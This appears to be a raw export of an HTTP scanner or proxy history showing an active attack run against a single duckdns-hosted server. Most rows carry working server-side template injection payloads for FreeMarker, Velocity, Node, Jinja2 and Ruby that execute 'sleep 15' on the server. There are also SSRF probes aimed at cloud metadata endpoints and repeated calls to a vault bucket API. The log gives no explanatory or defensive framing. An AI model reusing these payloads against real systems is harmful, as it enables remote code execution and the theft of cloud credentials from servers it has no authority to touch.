ID,Req. Timestamp,Resp. Timestamp,Method,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
5494,Sat May 23 22:20:04 WIB 2026,Sat May 23 22:20:04 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/computeMetadata/v1/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,497,1143,464
5495,Sat May 23 22:20:04 WIB 2026,Sat May 23 22:20:04 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,246,1236,41
5496,Sat May 23 22:20:04 WIB 2026,Sat May 23 22:20:04 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1,403,Forbidden,254,1069,25
5497,Sat May 23 22:20:04 WIB 2026,Sat May 23 22:20:04 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=zj%7B%235755*7055%7Dzj&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,246,1143,464
5498,Sat May 23 22:20:04 WIB 2026,Sat May 23 22:20:04 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,235,1236,41
5499,Sat May 23 22:20:04 WIB 2026,Sat May 23 22:20:04 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,249,1324,30
5500,Sat May 23 22:20:04 WIB 2026,Sat May 23 22:20:04 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=zj%7B%401982*5190%7Dzj&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,243,1143,464
5501,Sat May 23 22:20:04 WIB 2026,Sat May 23 22:20:04 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault,403,Forbidden,243,1171,25
5502,Sat May 23 22:20:04 WIB 2026,Sat May 23 22:20:04 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/opc/v1/instance/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,259,1143,464
5503,Sat May 23 22:20:04 WIB 2026,Sat May 23 22:20:05 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,244,1236,41
5504,Sat May 23 22:20:04 WIB 2026,Sat May 23 22:20:05 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/assets,301,Moved Permanently,234,758,156
5505,Sat May 23 22:20:04 WIB 2026,Sat May 23 22:20:05 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,252,1324,30
5506,Sat May 23 22:20:04 WIB 2026,Sat May 23 22:20:05 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/opc/v1/instance/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,245,1143,464
5507,Sat May 23 22:20:04 WIB 2026,Sat May 23 22:20:05 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=zj%7B%7B7666*3938%7D%7Dzj&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,247,1143,464
5508,Sat May 23 22:20:05 WIB 2026,Sat May 23 22:20:05 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,21,1236,41
5509,Sat May 23 22:20:05 WIB 2026,Sat May 23 22:20:05 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,237,1236,41
5510,Sat May 23 22:20:05 WIB 2026,Sat May 23 22:20:05 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,251,1324,30
5511,Sat May 23 22:20:05 WIB 2026,Sat May 23 22:20:05 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=zj%7B%7B%3D7887*5999%7D%7Dzj&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,253,1143,464
5512,Sat May 23 22:20:05 WIB 2026,Sat May 23 22:20:05 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/opc/v2/instance/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,253,1143,464
5513,Sat May 23 22:20:05 WIB 2026,Sat May 23 22:20:05 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,241,1236,41
5514,Sat May 23 22:20:05 WIB 2026,Sat May 23 22:20:05 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,243,1324,30
5515,Sat May 23 22:20:05 WIB 2026,Sat May 23 22:20:05 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=zj%3C%25%3D3603*5268%25%3Ezj&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,247,1143,464
5516,Sat May 23 22:20:05 WIB 2026,Sat May 23 22:20:05 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/opc/v2/instance/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,250,1143,464
5517,Sat May 23 22:20:05 WIB 2026,Sat May 23 22:20:05 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,267,1236,41
5518,Sat May 23 22:20:05 WIB 2026,Sat May 23 22:20:06 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,487,1324,30
5519,Sat May 23 22:20:05 WIB 2026,Sat May 23 22:20:06 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,244,1236,41
5520,Sat May 23 22:20:05 WIB 2026,Sat May 23 22:20:06 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=zj%23set%28%24x%3D1842*4942%29%24%7Bx%7Dzj&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,495,1143,464
5521,Sat May 23 22:20:05 WIB 2026,Sat May 23 22:20:06 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/latest/meta-data/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,493,1143,464
5522,Sat May 23 22:20:06 WIB 2026,Sat May 23 22:20:06 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,247,1324,30
5523,Sat May 23 22:20:06 WIB 2026,Sat May 23 22:20:06 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=zj%3Cp+th%3Atext%3D%22%24%7B9864*8999%7D%22%3E%3C%2Fp%3Ezj&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,242,1143,464
5524,Sat May 23 22:20:06 WIB 2026,Sat May 23 22:20:06 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,242,1236,41
5525,Sat May 23 22:20:06 WIB 2026,Sat May 23 22:20:06 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/latest/meta-data/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,244,1143,464
5526,Sat May 23 22:20:06 WIB 2026,Sat May 23 22:20:06 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,24,1324,30
5527,Sat May 23 22:20:06 WIB 2026,Sat May 23 22:20:06 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,242,1236,41
5528,Sat May 23 22:20:06 WIB 2026,Sat May 23 22:20:06 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=zj%7B%40math+key%3D%229040%22+method%3D%22multiply%22+operand%3D%222192%22%2F%7Dzj&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,247,1143,464
5529,Sat May 23 22:20:06 WIB 2026,Sat May 23 22:20:06 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,233,1324,30
5530,Sat May 23 22:20:06 WIB 2026,Sat May 23 22:20:06 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,241,1236,73
5531,Sat May 23 22:20:06 WIB 2026,Sat May 23 22:20:06 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/metadata/instance?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,250,1143,464
5532,Sat May 23 22:20:06 WIB 2026,Sat May 23 22:20:06 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,19,1236,41
5533,Sat May 23 22:20:06 WIB 2026,Sat May 23 22:20:06 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=zj%7B%7B23140%7Cadd%3A36330%7D%7Dzj&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,19,1143,464
5534,Sat May 23 22:20:06 WIB 2026,Sat May 23 22:20:06 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,246,1324,30
5535,Sat May 23 22:20:06 WIB 2026,Sat May 23 22:20:06 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,243,1236,41
5536,Sat May 23 22:20:06 WIB 2026,Sat May 23 22:20:06 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/metadata/v1?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,261,1143,464
5537,Sat May 23 22:20:06 WIB 2026,Sat May 23 22:20:06 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=zj%7B%7Bprint+%228104%22+%227055%22%7D%7Dzj&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,248,1143,464
5538,Sat May 23 22:20:06 WIB 2026,Sat May 23 22:20:07 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,241,1324,30
5539,Sat May 23 22:20:06 WIB 2026,Sat May 23 22:20:07 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,246,1236,41
5540,Sat May 23 22:20:06 WIB 2026,Sat May 23 22:20:07 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=zj+3821*1689+zj,200,OK,242,1143,464
5541,Sat May 23 22:20:07 WIB 2026,Sat May 23 22:20:07 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,21,1324,30
5542,Sat May 23 22:20:06 WIB 2026,Sat May 23 22:20:07 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/openstack/latest/meta_data.json?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,248,1143,464
5543,Sat May 23 22:20:13 WIB 2026,Sat May 23 22:20:16 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=zj%23%7B6159*2673%7Dzj,200,OK,2759,1143,464
5544,Sat May 23 22:20:16 WIB 2026,Sat May 23 22:20:16 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=zj%7B%238746*5465%7Dzj,200,OK,232,1143,464
5545,Sat May 23 22:20:16 WIB 2026,Sat May 23 22:20:16 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=zj%7B%407375*8030%7Dzj,200,OK,18,1143,464
5546,Sat May 23 22:20:16 WIB 2026,Sat May 23 22:20:16 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=zj%7B%7B3409*8977%7D%7Dzj,200,OK,235,1143,464
5547,Sat May 23 22:20:25 WIB 2026,Sat May 23 22:20:26 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=zj%3Cp+th%3Atext%3D%22%24%7B5189*6297%7D%22%3E%3C%2Fp%3Ezj,200,OK,1280,1143,464
5548,Sat May 23 22:20:26 WIB 2026,Sat May 23 22:20:26 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=zj%7B%40math+key%3D%229168%22+method%3D%22multiply%22+operand%3D%223006%22%2F%7Dzj,200,OK,233,1143,464
5550,Sat May 23 22:20:35 WIB 2026,Sat May 23 22:20:37 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,2515,1236,73
5551,Sat May 23 22:20:43 WIB 2026,Sat May 23 22:20:45 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,2498,1236,41
5552,Sat May 23 22:20:57 WIB 2026,Sat May 23 22:20:59 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,1749,1236,73
5553,Sat May 23 22:20:59 WIB 2026,Sat May 23 22:20:59 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,19,1236,73
5554,Sat May 23 22:21:00 WIB 2026,Sat May 23 22:21:00 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,18,1236,73
5555,Sat May 23 22:21:00 WIB 2026,Sat May 23 22:21:00 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,20,1236,73
5556,Sat May 23 22:21:00 WIB 2026,Sat May 23 22:21:00 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,155,1236,73
5557,Sat May 23 22:21:00 WIB 2026,Sat May 23 22:21:00 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,18,1236,73
5558,Sat May 23 22:21:00 WIB 2026,Sat May 23 22:21:00 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,139,1236,73
5559,Sat May 23 22:21:00 WIB 2026,Sat May 23 22:21:00 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,18,1236,73
5560,Sat May 23 22:21:01 WIB 2026,Sat May 23 22:21:01 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,18,1236,73
5561,Sat May 23 22:21:01 WIB 2026,Sat May 23 22:21:01 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,18,1236,73
5562,Sat May 23 22:21:02 WIB 2026,Sat May 23 22:21:02 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,18,1236,73
5564,Sat May 23 22:21:02 WIB 2026,Sat May 23 22:21:02 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,17,1236,73
5565,Sat May 23 22:21:02 WIB 2026,Sat May 23 22:21:02 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,155,1236,73
5566,Sat May 23 22:21:02 WIB 2026,Sat May 23 22:21:02 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,17,1236,73
5567,Sat May 23 22:21:03 WIB 2026,Sat May 23 22:21:03 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,17,1236,73
5568,Sat May 23 22:21:03 WIB 2026,Sat May 23 22:21:03 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,18,1236,73
5569,Sat May 23 22:21:03 WIB 2026,Sat May 23 22:21:03 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22sleep+15%22%29+%7D&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,24,1143,464
5570,Sat May 23 22:21:03 WIB 2026,Sat May 23 22:21:03 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,23,1236,41
5571,Sat May 23 22:21:03 WIB 2026,Sat May 23 22:21:03 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,20,1236,41
5572,Sat May 23 22:21:03 WIB 2026,Sat May 23 22:21:03 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=%23set%28%24engine%3D%22%22%29%0A%23set%28%24proc%3D%24engine.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22sleep+15%22%29%29%0A%23set%28%24null%3D%24proc.waitFor%28%29%29%0A%24%7Bnull%7D&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,23,1143,464
5573,Sat May 23 22:21:03 WIB 2026,Sat May 23 22:21:03 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,212,1236,41
5574,Sat May 23 22:21:03 WIB 2026,Sat May 23 22:21:03 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,262,1236,73
5575,Sat May 23 22:21:03 WIB 2026,Sat May 23 22:21:03 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,261,1324,30
5576,Sat May 23 22:21:03 WIB 2026,Sat May 23 22:21:03 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080,200,OK,267,1143,464
5577,Sat May 23 22:21:03 WIB 2026,Sat May 23 22:21:03 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=%7B%7B%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29+%7D%7D&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,223,1143,464
5578,Sat May 23 22:21:03 WIB 2026,Sat May 23 22:21:03 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,252,1236,41
5579,Sat May 23 22:21:09 WIB 2026,Sat May 23 22:21:10 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,1009,1143,464
5580,Sat May 23 22:21:10 WIB 2026,Sat May 23 22:21:10 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,21,1143,464
5581,Sat May 23 22:21:09 WIB 2026,Sat May 23 22:21:10 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,1474,1236,41
5582,Sat May 23 22:21:09 WIB 2026,Sat May 23 22:21:10 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,1256,1236,73
5583,Sat May 23 22:21:09 WIB 2026,Sat May 23 22:21:10 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,1265,1324,30
5584,Sat May 23 22:21:09 WIB 2026,Sat May 23 22:21:10 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault,403,Forbidden,1266,1171,25
5585,Sat May 23 22:21:10 WIB 2026,Sat May 23 22:21:10 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,237,1143,464
5586,Sat May 23 22:21:10 WIB 2026,Sat May 23 22:21:10 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,23,1236,41
5587,Sat May 23 22:21:10 WIB 2026,Sat May 23 22:21:10 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,19,1236,73
5588,Sat May 23 22:21:10 WIB 2026,Sat May 23 22:21:11 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,234,1324,30
5589,Sat May 23 22:21:10 WIB 2026,Sat May 23 22:21:11 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,231,1236,73
5590,Sat May 23 22:21:10 WIB 2026,Sat May 23 22:21:11 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/assets,301,Moved Permanently,236,758,156
5591,Sat May 23 22:21:10 WIB 2026,Sat May 23 22:21:11 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,236,1236,41
5592,Sat May 23 22:21:10 WIB 2026,Sat May 23 22:21:11 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,248,1143,464
5593,Sat May 23 22:21:11 WIB 2026,Sat May 23 22:21:11 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,20,1324,30
5594,Sat May 23 22:21:11 WIB 2026,Sat May 23 22:21:11 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,19,1236,73
5595,Sat May 23 22:21:11 WIB 2026,Sat May 23 22:21:11 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,19,1236,41
5596,Sat May 23 22:21:11 WIB 2026,Sat May 23 22:21:11 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=%3C%25%3D%25x%28sleep+15%29%25%3E&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,19,1143,464
5597,Sat May 23 22:21:11 WIB 2026,Sat May 23 22:21:11 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,230,1324,30
5598,Sat May 23 22:21:11 WIB 2026,Sat May 23 22:21:11 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,225,1236,41
5599,Sat May 23 22:21:11 WIB 2026,Sat May 23 22:21:11 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,228,1236,73
5600,Sat May 23 22:21:11 WIB 2026,Sat May 23 22:21:11 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=%23%7B%25x%28sleep+15%29%7D&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,222,1143,464
5601,Sat May 23 22:21:11 WIB 2026,Sat May 23 22:21:11 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,21,1324,30
